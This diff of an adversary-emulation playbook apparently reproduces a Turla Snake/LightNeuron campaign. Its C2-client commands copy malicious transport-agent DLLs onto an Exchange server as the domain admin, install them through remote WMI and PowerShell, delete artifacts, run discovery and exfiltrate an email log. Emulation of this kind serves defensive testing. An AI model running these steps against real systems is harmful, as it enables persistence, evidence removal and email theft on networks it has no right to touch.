+
+- id: 09fc13b4-b345-41ce-b5a8-4214a37b627a
+  name: Download the LightNeuron config file (Adversary)
+  description: |
+    Task Snake to download the LightNeuron config file.
+  tactic: Execution
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_execution
+  procedure_step: 18.A.2
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 4, "file": "winmail.dat", "dest":"C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+
+- id: fea61ba7-d932-4a42-b988-5cf9de3ed118
+  name: Copy LightNeuron transport agent DLL to the Exchange Server (Adversary)
+  description: |
+    Task Snake to copy LightNeuron using token impersonation to perform the copy as the domain admin.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxconf.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\V15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+- id: 8c6bfbe8-60f0-4ca8-a955-c35be84be374
+  name: Copy LightNeuron companion DLL to the Exchange Server (Adversary)
+  description: |
+    Task Snake to copy the LightNeuron companion DLL using token impersonation to perform the copy as the domain admin.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\mtxcli.dll \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\exdbdata.dll\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+- id: 2d061b67-5d49-4a0c-a7af-1b8a3a6fdd78
+  name: Copy PowerShell installation script to the Exchange Server (Adversary)
+  description: |
+    Task Snake to copy PowerShell installation script to the Exchange Server using token impersonation to perform the copy as the domain admin.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\msiex.ps1 \\\\#{fourth.target.host}\\C$\\Windows\\System32\\msiex.ps1", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+- id: ded4d5a0-bcd6-41f8-899b-9fa4fddac445
+  name: Copy email rules file to the Exchange server (Adversary)
+  description: |
+    Task Snake to copy the email rules file to the Exchange server, using token impersonation to perform the copy as the domain admin.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\wdr.rules.xml \\\\#{fourth.target.host}\\C$\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\msmdat.xml", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+- id: 0ee2902a-f75e-4367-9e99-2124d3070b4e
+  name: Copy config file to the Exchange server (Adversary)
+  description: |
+    Task Snake to copy the config file to the Exchange server, using token impersonation to perform the copy as the domain admin.
+  tactic: Lateral Movement
+  technique:
+    attack_id: T1570
+    name: "Lateral Tool Transfer"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 18.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "copy C:\\Windows\\System32\\perfe009.dat \"\\\\#{fourth.target.host}\\C$\\Program Files\\Microsoft\\Exchange Server\\v15\\bin\\winmail.dat\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60
+
+- id: 6dd62c1c-b65c-4e28-b241-04121cbbc9af
+  name: Install LightNeuron on the Exchange Server (Adversary)
+  description: |
+    Task Snake to install LightNeuron remotely using WMI and PowerShell, using the domain admin's token
+  tactic: Persistence
+  technique:
+    attack_id: T1505.002
+    name: "Server Software Component: Transport Agent"
+  procedure_group: procedure_persistence
+  procedure_step: 18.A.7
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 3, "proc": "wmic.exe", "args": "/node:#{fourth.target.host} /privileges:enable /output:STDOUT process call create \"cmd.exe /c powershell.exe -File C:\\Windows\\System32\\msiex.ps1 > C:\\Windows\\Temp\\msiexinstallation.log 2>&1\"", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep 'ReturnValue = 0;' -i
+
+- id: 658daa6f-97c0-41c0-af97-d6b4969d2e7c
+  name: Check installation log (Adversary)
+  description: |
+    Task Snake to check the installation log for any errors.
+  tactic: Execution
+  technique: 
+    attack_id: T1059.003
+    name: "Command and Scripting Interpreter: Windows Command Shell"
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "type \\\\#{fourth.target.host}\\C$\\Windows\\Temp\\msiexinstallation.log", "runas": "#{network.domain.name}\\#{domain.admin.user}"}' --task-wait-timeout 60 | grep "Waiting for service 'Microsoft Exchange Transport (MSExchangeTransport)' to start..." -i
+
+- id: 38023f7d-d776-46bb-bbfc-1f4853e8169b
+  name: Delete artifacts from the fourth target host (Adversary)
+  description: |
+    Task Snake to remove artifacts from the fourth target host:
+  tactic: Defense Evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal: File Deletion"
+  procedure_group: procedure_defense_evasion
+  procedure_step: 18.A.9
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task 475e465e424557475b42 '{"type": 1, "command": "del /Q C:\\Windows\\System32\\msiex.ps1 C:\\Windows\\System32\\wdr.rules.xml C:\\Windows\\System32\\mtxconf.dll C:\\Windows\\System32\\mtxcli.dll C:\\Windows\\System32\\perfe009.dat"}' --task-wait-timeout 60
+
+
+# Step 19 - Discovery and Email Collection
+
+- id: def5cfe8-7aea-4cd3-803f-2c55e616c1fe
+  name: Perform system network configuration discovery (Adversary)
+  description: |
+    Task LightNeuron to perform system network configuration discovery.
+  tactic: Discovery
+  technique:
+    attack_id: T1016
+    name: "System Network Configuration Discovery"
+  procedure_group: procedure_discovery
+  procedure_step: 19.A.1-19.A.5
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task info@#{network.domain.name}.local '5 | ipconfig /all' --task-wait-timeout 60
+
+- id: fdcbcf07-0487-4757-8b09-6c1ce93220b9
+  name: Send emails (User)
+  description: |
+    Generate email traffic for LightNeuron to capture
+  tactic: x
+  technique:
+    attack_id: x
+    name: x
+  procedure_group: x
+  procedure_step: x
+  platforms:
+    linux:
+      sh:
+        command: |
+          sudo smbclient -U '#{network.domain.name}\#{domain.admin.user}'%'#{second.target.password}' //#{third.target.ip}/c$ -c 'put ../caldera_port/send-email-to-egle.ps1 Users\Public\send-email-to-egle.ps1';
+          sudo smbclient -U '#{network.domain.name}\#{domain.admin.user}'%'#{second.target.password}' //#{third.target.ip}/c$ -c 'put ../caldera_port/Microsoft.Exchange.WebServices.dll Users\Public\Microsoft.Exchange.WebServices.dll';
+          sudo smbclient -U '#{network.domain.name}\#{domain.admin.user}'%'#{second.target.password}' //#{first.target.ip}/c$ -c 'put ../caldera_port/send-email-to-zilvinas.ps1 Users\Public\send-email-to-zilvinas.ps1';
+          sudo smbclient -U '#{network.domain.name}\#{domain.admin.user}'%'#{second.target.password}' //#{first.target.ip}/c$ -c 'put ../caldera_port/Microsoft.Exchange.WebServices.dll Users\Public\Microsoft.Exchange.WebServices.dll';
+          rdp_pid=$(ps -ef | grep '[:]#{third.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "cd C";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "\Users\Public";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" ".\send-email-to-egle.ps1";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+
+          rdp_pid=$(ps -ef | grep '[:]#{first.target.ip}' | awk {'print $2'});
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L+r;
+          sleep 6;
+          xdotool type --window "$rdp_window" "powershell";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" "cd C";
+          xdotool key --window "$rdp_window" shift+colon; 
+          xdotool type --window "$rdp_window" "\Users\Public";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+          xdotool type --window "$rdp_window" ".\send-email-to-zilvinas.ps1";
+          sleep 6;
+          xdotool key --window "$rdp_window" Return;
+          sleep 6;
+        timeout: 300
+
+- id: 4d10b3a8-6199-4615-861f-e4292630a9b9
+  name: Exfiltrate the email log file (Adversary)
+  description: |
+    Task the LightNeuron implant to exfiltrate the email log file.
+  tactic: Exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  procedure_group: procedure_exfiltration
+  procedure_step: 19.A.12
+  platforms:
+    linux:
+      sh:
+        command: |
+          ./evalsC2client.py --set-and-complete-task info@#{network.domain.name}.local '3 | 0' --task-wait-timeout 60
